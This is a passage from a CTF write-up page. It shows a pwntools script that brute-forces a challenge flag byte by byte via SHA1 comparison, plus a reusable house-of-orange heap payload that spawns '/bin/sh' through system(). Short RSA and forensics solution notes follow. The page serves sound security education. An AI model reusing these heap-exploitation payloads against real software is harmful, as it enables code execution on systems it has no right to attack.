tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

<span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">2</span>:
    DEBUG = <span class="hljs-number">0</span>
    HOST = sys.argv[<span class="hljs-number">1</span>]
    PORT = int(sys.argv[<span class="hljs-number">2</span>])

    p = remote(HOST, PORT)
<span class="hljs-keyword">else</span>:
    DEBUG = <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">2</span>:
        PATH = sys.argv[<span class="hljs-number">1</span>].split()

    p = process(PATH)


<span class="hljs-comment"># by w1tcher who dominates pwnable challenges</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span><span class="hljs-params">(head_addr, system_addr, io_list_all)</span>:</span>
    payload = <span class="hljs-string">b'/bin/sh\x00'</span>
    payload = payload + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(io_list_all - <span class="hljs-number">16</span>)
    payload = payload + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(system_addr) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>
    payload = payload + p64(head_addr + <span class="hljs-number">18</span> * <span class="hljs-number">8</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(<span class="hljs-number">0</span>) + \
            p64(<span class="hljs-number">0xffffffffffffffff</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(head_addr + <span class="hljs-number">12</span> * <span class="hljs-number">8</span>)
    <span class="hljs-keyword">return</span> payload


orig_attach = gdb.attach
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gdb_attach</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
    <span class="hljs-keyword">if</span> DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span><span class="hljs-params">(p, n)</span>:</span>
    p.ru(<span class="hljs-string">'quit\n'</span>)
    p.sl(str(n))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span><span class="hljs-params">(p, s)</span>:</span>
    choose(p, <span class="hljs-number">1</span>)
    p.ru(<span class="hljs-string">'format)\n'</span>)
    p.sl(binascii.hexlify(s))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(p)</span>:</span>
    choose(p, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> p.rl().strip()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(p, s)</span>:</span>
    flag_sha1 = read(p)
    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'temp'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
        f.write(s)
    cmd = <span class="hljs-string">'./getsha1.sh'</span>.split()
    <span class="hljs-keyword">with</span> process(cmd) <span class="hljs-keyword">as</span> x:
        sha1 = x.rl().strip()
    <span class="hljs-keyword">if</span> sha1 == flag_sha1:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flag_len_le</span><span class="hljs-params">(p, n)</span>:</span>
    p.info(<span class="hljs-string">'checking length {}'</span>.format(n))
    choose(p, <span class="hljs-number">1337</span>)
    s = <span class="hljs-string">'a'</span> * n
    write(p, s)
    <span class="hljs-keyword">if</span> check(p, s):
        p.info(<span class="hljs-string">'True'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        p.info(<span class="hljs-string">'False'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_length</span><span class="hljs-params">(p, l, r)</span>:</span>
    p.info(<span class="hljs-string">'l {} r {}'</span>.format(l, r))
    <span class="hljs-keyword">if</span> l == r:
        <span class="hljs-keyword">return</span> l
    mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> flag_len_le(p, mid):
        r = mid
        <span class="hljs-keyword">return</span> guess_length(p, l, r)
    <span class="hljs-keyword">else</span>:
        l = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> guess_length(p, l, r)

flag_postfix = <span class="hljs-string">''</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_byte</span><span class="hljs-params">(p, b, idx)</span>:</span>
    <span class="hljs-keyword">global</span> flag_postfix
    p.info(<span class="hljs-string">'guessing #{} with {}'</span>.format(idx, b))
    prepend_n = max(idx - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)
    guessing_flag = prepend_n * <span class="hljs-string">'a'</span> + b + flag_postfix
    p.info(<span class="hljs-string">'testing {}'</span>.format(guessing_flag))
    choose(p, <span class="hljs-number">1337</span>)
    <span class="hljs-keyword">if</span> prepend_n &gt; <span class="hljs-number">0</span>:
        write(p, <span class="hljs-string">'a'</span> * prepend_n)
    confirmed = check(p, guessing_flag)
    <span class="hljs-keyword">if</span> confirmed:
        p.info(<span class="hljs-string">'success, flag postfix {}'</span>.format(flag_postfix))
        flag_postfix = b + flag_postfix
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        p.info(<span class="hljs-string">'failed'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> flag_postfix
    <span class="hljs-comment">#length = guess_length(0, 0x40) # 32</span>
    length = <span class="hljs-number">32</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(length, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>):
        guessed = <span class="hljs-keyword">False</span>
        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:
            <span class="hljs-comment">#with process('ruby hexdump.rb'.split()) as p:</span>
            <span class="hljs-keyword">with</span> remote(HOST, PORT) <span class="hljs-keyword">as</span> p:
                <span class="hljs-keyword">if</span> guess_byte(p, x, i):
                    guessed = <span class="hljs-keyword">True</span>
                    <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> guessed:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">'not found for #{}'</span>.format(i))

    p.info(<span class="hljs-string">'flag {}'</span>.format(flag_postfix))

    p.irt()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()

</code></pre><p><code>getsha1.sh</code></p>
<pre class="hljs"><code><span class="hljs-meta">#!/bin/sh
</span>
sha1sum temp | awk <span class="hljs-string">'{ print $1 }'</span></code></pre><h3 id="ev3-player"><a class="header-link" href="#ev3-player"></a>EV3 Player</h3>
<p>Analysis the .pklg file, there are three file in it. <code>fl.srf</code>, <code>ag.srf</code>, <code>hello.srf</code>ï¼Œthese files can open by Lego Mindstorms software. Load it, then we can hear the flag!</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
<h3 id="lost-modulus-again-[200pts]"><a class="header-link" href="#lost-modulus-again-[200pts]"></a>Lost Modulus Again [200pts]</h3>
<p>The program leaks e, d, iqmp, ipmq.</p>
<p>ipmq <em> p = 1 (mod q)
iqmp </em> q = 1 (mod p)
=&gt;
ipmq  <em> p + iqmp  </em> q - pq = 1    (eq1)</p>
<p>d <em> e = 1 (mod phi(n))
bitnum(d </em> e - 1) = 2068
bitnum(phi(n)) ~ 2048
=&gt;
factor d*e-1 get phi(n) by comparing the bitnum.
(p-1) * (q-1) = phi(n)    (eq2)</p>
<p>With eq1 and eq2 we can solve p, q.</p>
<h3 id="very-simple-haskell-[200pts]"><a class="header-link" href="#very-simple-haskell-[200pts]"></a>Very Simple Haskell [200pts]</h3>
<p>There are only three blocks of length k to calculate.</p>
<p>We can get the flag if we known which primes are used to calculate the cyphertext.</p>
<p>One of the block contains the bit length of the message, which is already known. The other two blocks contain the message. Many bits of the message are known. The unknown part is only 48 bits.</p>
<p>We caculate the first k primes and their inverses under modulo n. All the known parts of blocks can be cleared away in the ciphertext by multiplying the inverse of the corresponding prime number. After that, the result, which is a product of at most 48 small primes and less than n, could be factored.</p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
